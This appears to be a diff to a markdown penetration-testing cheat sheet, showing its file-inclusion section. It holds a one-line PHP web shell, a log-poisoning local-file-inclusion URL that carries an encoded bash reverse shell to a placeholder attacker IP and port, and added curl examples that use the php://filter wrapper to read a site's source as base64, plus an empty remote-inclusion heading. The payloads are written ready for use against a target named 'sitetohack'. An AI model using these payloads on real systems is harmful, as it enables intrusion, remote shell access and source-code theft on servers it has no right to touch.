@@ -13,6 +13,8 @@ Apache 2.4.49 CVE: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773
 
 ## File inclusion
 
+### Local file inclusion
+
 Php snipet:
 ```
 <?php echo system($_GET['cmd']);?>
@@ -21,6 +23,21 @@ and poison the log files with a Header (e.g. [User-Agent](https://developer.mozi
 ```
 http://sitetohack/index.php?page=../../../../../../../../../../var/log/apache2/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F___AttackerIP___%2F___AttackerPort___%200%3E%261%22
 ```
+
+Wrappers:
+- all: https://www.php.net/manual/en/wrappers.php
+- php: https://www.php.net/manual/en/wrappers.php.php
+- data: https://www.php.net/manual/en/wrappers.data.php
+
+Examples:
+```
+curl http://site/index.php?page=php://filter/resource=somepage.php
+curl http://site/index.php?page=php://filter/convert.base64-encode/resource=somepage.php
+```
+
+### Remote file inclusion
+
+
 
 ## File upload
 
